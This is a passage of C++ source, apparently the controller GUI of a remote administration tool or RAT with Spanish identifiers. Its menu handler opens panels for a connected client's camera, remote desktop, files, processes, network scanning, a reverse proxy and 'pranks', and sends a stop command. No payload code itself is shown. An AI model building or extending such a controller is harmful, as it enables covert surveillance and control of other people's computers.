    else if (menuID == EnumMenuMods::ID_OnCamara) {
        panelCamara* panelCam = new panelCamara(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelCam->Show();
    }else if (menuID == EnumMenuMods::ID_OnEscritorioRemoto) {
        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        frameRemote->Show();
    }else if (menuID == EnumMenuMods::ID_OnAdminVentanas) {
        panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelWM->Show();
    }else if (menuID == EnumMenuMods::ID_OnInfo) {
        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelINF->Show();
    }else if (menuID == EnumMenuMods::ID_OnEscanerRed) {
        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelSCAN->Show();
    }else if (menuID == EnumMenuMods::ID_OnBromas) {
        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelFUN->Show();
    }else if (menuID == EnumMenuMods::ID_OnAdminArchivos) {
        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp, c_key);
        panelFM->Show();
    }else if (menuID == EnumMenuMods::ID_OnProxyInversa) {
        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelPROXY->Show();
    }else if (menuID == EnumMenuMods::ID_OnAdminProcesos) {
        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
        panelPM->Show();
    }
    //Comandos de cliente, cerrar, reiniciar, actualizar, desinstalar
    else if (menuID == EnumIDS::ID_CerrarProceso) {
        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP, c_key);
        p_Servidor->m_CerrarConexion(tmpSocket);
    } 
}